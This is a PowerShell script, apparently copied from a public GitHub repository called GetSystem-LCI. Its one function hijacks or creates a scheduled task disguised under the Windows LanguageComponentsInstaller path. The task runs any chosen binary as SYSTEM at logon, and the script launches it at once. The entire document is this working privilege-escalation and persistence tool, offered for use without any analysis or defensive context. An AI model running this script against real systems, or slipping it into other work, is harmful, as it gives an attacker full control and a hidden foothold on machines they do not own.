# from here https://raw.githubusercontent.com/Helixo32/GetSystem-LCI/refs/heads/main/GetSystem-LCI.ps1
function GetSystem-LCI {
    param (
        [string]$BinaryPath
    )

    # Define the name and path of the task
    $TaskName = "Uninstallation"
    $TaskPath = "\Microsoft\Windows\LanguageComponentsInstaller"

    try {
        Write-Output "Checking if the task '$TaskPath\$TaskName' already exists..."

        # Verify if the task exists
        $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        if ($null -ne $task) {
            Write-Output "The task '$TaskPath\$TaskName' already exists. Updating the task..."

            # Enable the task and update the action
            Enable-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName | Out-Null
            $Action = New-ScheduledTaskAction -Execute $BinaryPath
            Set-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName -Action $Action | Out-Null
            Write-Output "The task action has been updated to execute '$BinaryPath'."
        } else {
            Write-Output "The task '$TaskPath\$TaskName' does not exist. Creating it..."

            # Ensure the task folder exists
            $service = New-Object -ComObject Schedule.Service
            $service.Connect()
            $rootFolder = $service.GetFolder("\Microsoft\Windows")
            try {
                $rootFolder.GetFolder("LanguageComponentsInstaller") | Out-Null
                Write-Output "Task folder exists: $TaskPath."
            } catch {
                $rootFolder.CreateFolder("LanguageComponentsInstaller") | Out-Null
                Write-Output "Created task folder: $TaskPath."
            }

            # Define triggers and actions for the new task
            $Trigger = New-ScheduledTaskTrigger -AtLogOn
            $Action = New-ScheduledTaskAction -Execute $BinaryPath

            # Register the new scheduled task
            Register-ScheduledTask -TaskName $TaskName -TaskPath $TaskPath -Trigger $Trigger -Action $Action -RunLevel Highest -User "SYSTEM"  | Out-Null
            Write-Output "The task '$TaskName' has been created in '$TaskPath'."
        }

        # Add a delay to ensure the task is registered properly before querying it
        Start-Sleep -Seconds 2

        # Verify the task is visible in Task Scheduler
        $task = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        if ($null -eq $task) {
            throw "Failed to retrieve the task '$TaskName'. Verify that it exists in Task Scheduler under '$TaskPath'."
        }

        Write-Output "Task '$TaskName' has been verified successfully."

        # Update task settings
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Set-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName -Settings $settings | Out-Null
        Write-Output "The task settings have been updated."

        # Start the task immediately
        Start-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName | Out-Null
        Write-Output "The task has been started successfully."
    } catch {
        if ($_.Exception.Message -match "Cannot create a file when that file already exists") {
            Write-Warning "The task appears to be in an inconsistent state. Removing and recreating it..."

            # Remove and recreate the task
            Unregister-ScheduledTask -TaskPath $TaskPath -TaskName $TaskName -Confirm:$false | Out-Null
            GetSystem-LCI -BinaryPath $BinaryPath
        } else {
            Write-Error "Error while processing the task: $_"
        }
    }
}
